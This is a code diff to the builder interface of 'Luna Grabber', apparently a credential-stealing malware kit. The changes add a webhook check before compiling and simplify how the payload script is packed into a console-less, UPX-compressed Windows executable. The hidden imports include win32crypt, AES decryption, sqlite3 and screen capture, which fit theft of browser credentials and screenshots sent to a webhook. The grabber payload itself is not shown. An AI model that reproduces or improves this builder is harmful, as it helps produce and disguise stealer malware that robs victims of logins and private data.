@@ -25,12 +25,11 @@ logging.basicConfig(
 
 logger = logging.getLogger(__name__)
 
-
 class App(customtkinter.CTk):
     def __init__(self):
         super().__init__()
 
-        self.title("Luna Grabber Builder")
+        self.title(f"Luna Grabber Builder - Running on v{sys.version.split()[0]}")
         self.geometry("1000x550")
         self.grid_rowconfigure(0, weight=1)
         self.grid_columnconfigure(1, weight=1)
@@ -462,6 +461,11 @@ class App(customtkinter.CTk):
             logging.error(f"Error with file pumper: {e}")
 
     def compile_file(self, filename, filetype):
+        if not self.verify_webhook():
+            _message = "Webhook not valid. Aborting compilation."
+            logging.error(_message)
+            print(_message)
+            return
         try:
             if self.iconpath is None:
                 exeicon = "NONE"
@@ -472,35 +476,30 @@ class App(customtkinter.CTk):
             script_path = os.path.join(current_dir, f"{filename}.py")
 
             if filetype == "pyinstaller":
-                venv_dir = next((d for d in os.listdir(current_dir) if d.startswith('.venv')), None)
-                if venv_dir:
-                    venv_python = os.path.join(current_dir, venv_dir, "Scripts", "python")
-                    subprocess.run([venv_python, os.path.join(current_dir, "tools", "upx.py")])
-                    subprocess.run([venv_python, "-m", "PyInstaller",
-                                    "--onefile", "--clean", "--noconsole",
-                                    "--upx-dir=./tools", "--distpath=./",
-                                    "--hidden-import", "base64",
-                                    "--hidden-import", "ctypes",
-                                    "--hidden-import", "json",
-                                    "--hidden-import", "re",
-                                    "--hidden-import", "time",
-                                    "--hidden-import", "typing",
-                                    "--hidden-import", "subprocess",
-                                    "--hidden-import", "sys",
-                                    "--hidden-import", "sqlite3",
-                                    "--hidden-import", "requests_toolbelt",
-                                    "--hidden-import", "psutil",
-                                    "--hidden-import", "PIL",
-                                    "--hidden-import", "PIL.ImageGrab",
-                                    "--hidden-import", "PIL.Image",
-                                    "--hidden-import", "Cryptodome",
-                                    "--hidden-import", "Cryptodome.Cipher",
-                                    "--hidden-import", "Cryptodome.Cipher.AES",
-                                    "--hidden-import", "win32crypt",
-                                    "--icon", exeicon, script_path])
-                    logging.info(f"Successfully compiled {filename}.exe with pyinstaller")
-                else:
-                    logging.error("Virtual environment directory not found. Aborting PyInstaller.")
+                subprocess.run([sys.executable, os.path.join(current_dir, "tools", "upx.py")])
+                subprocess.run([sys.executable, "-m", "PyInstaller",
+                                "--onefile", "--clean", "--noconsole",
+                                "--upx-dir=./tools", "--distpath=./",
+                                "--hidden-import", "base64",
+                                "--hidden-import", "ctypes",
+                                "--hidden-import", "json",
+                                "--hidden-import", "re",
+                                "--hidden-import", "time",
+                                "--hidden-import", "typing",
+                                "--hidden-import", "subprocess",
+                                "--hidden-import", "sys",
+                                "--hidden-import", "sqlite3",
+                                "--hidden-import", "requests_toolbelt",
+                                "--hidden-import", "psutil",
+                                "--hidden-import", "PIL",
+                                "--hidden-import", "PIL.ImageGrab",
+                                "--hidden-import", "PIL.Image",
+                                "--hidden-import", "Cryptodome",
+                                "--hidden-import", "Cryptodome.Cipher",
+                                "--hidden-import", "Cryptodome.Cipher.AES",
+                                "--hidden-import", "win32crypt",
+                                "--icon", exeicon, script_path])
+                logging.info(f"Successfully compiled {filename}.exe with pyinstaller")
 
             elif filetype == "nuitka":
                 if sys.version_info[:2] > (3, 11):
@@ -508,40 +507,35 @@ class App(customtkinter.CTk):
                     logging.error("Nuitka does not support Python 3.12")
                     return
                 else:
-                    venv_dir = next((d for d in os.listdir(current_dir) if d.startswith('.venv')), None)
-                    if venv_dir:
-                        venv_python = os.path.join(current_dir, venv_dir, "Scripts", "python")
-                        try:
-                            if exeicon != "NONE":
-                                subprocess.run([
-                                    venv_python, "-m", "nuitka",
-                                    "--onefile", "--standalone", "--remove-output",
-                                    "--show-progress", "--prefer-source-code",
-                                    "--include-module=concurrent.futures", "--include-module=PIL.ImageGrab",
-                                    "--include-module=sqlite3", "--include-module=psutil",
-                                    "--include-module=requests", "--include-module=Cryptodome.Cipher.AES",
-                                    "--include-module=requests_toolbelt", "--include-module=win32crypt",
-                                    "--assume-yes-for-downloads", "--windows-disable-console",
-                                    f"--windows-icon-from-ico={exeicon}",
-                                    f"./{filename}.py"
-                                ])
-                            else:
-                                subprocess.run([
-                                    venv_python, "-m", "nuitka",
-                                    "--onefile", "--standalone", "--remove-output",
-                                    "--show-progress", "--prefer-source-code",
-                                    "--include-module=concurrent.futures", "--include-module=PIL.ImageGrab",
-                                    "--include-module=sqlite3", "--include-module=psutil",
-                                    "--include-module=requests", "--include-module=Cryptodome.Cipher.AES",
-                                    "--include-module=requests_toolbelt", "--include-module=win32crypt",
-                                    "--assume-yes-for-downloads", "--windows-disable-console",
-                                    f"./{filename}.py"
-                                ])
-                            logging.info(f"Successfully compiled {filename}.exe with nuitka")
-                        except Exception as e:
-                            logging.error(f"Error with compiling file: {e}")
-                    else:
-                        logging.error("Virtual environment directory not found. Aborting Nuitka.")
+                    try:
+                        if exeicon != "NONE":
+                            subprocess.run([
+                                sys.executable, "-m", "nuitka",
+                                "--onefile", "--standalone", "--remove-output",
+                                "--show-progress", "--prefer-source-code",
+                                "--include-module=concurrent.futures", "--include-module=PIL.ImageGrab",
+                                "--include-module=sqlite3", "--include-module=psutil",
+                                "--include-module=requests", "--include-module=Cryptodome.Cipher.AES",
+                                "--include-module=requests_toolbelt", "--include-module=win32crypt",
+                                "--assume-yes-for-downloads", "--windows-disable-console",
+                                f"--windows-icon-from-ico={exeicon}",
+                                f"./{filename}.py"
+                            ])
+                        else:
+                            subprocess.run([
+                                sys.executable, "-m", "nuitka",
+                                "--onefile", "--standalone", "--remove-output",
+                                "--show-progress", "--prefer-source-code",
+                                "--include-module=concurrent.futures", "--include-module=PIL.ImageGrab",
+                                "--include-module=sqlite3", "--include-module=psutil",
+                                "--include-module=requests", "--include-module=Cryptodome.Cipher.AES",
+                                "--include-module=requests_toolbelt", "--include-module=win32crypt",
+                                "--assume-yes-for-downloads", "--windows-disable-console",
+                                f"./{filename}.py"
+                            ])
+                        logging.info(f"Successfully compiled {filename}.exe with nuitka")
+                    except Exception as e:
+                        logging.error(f"Error with compiling file: {e}")
 
         except Exception as e:
             logging.error(f"Error with compiling file: {e}")
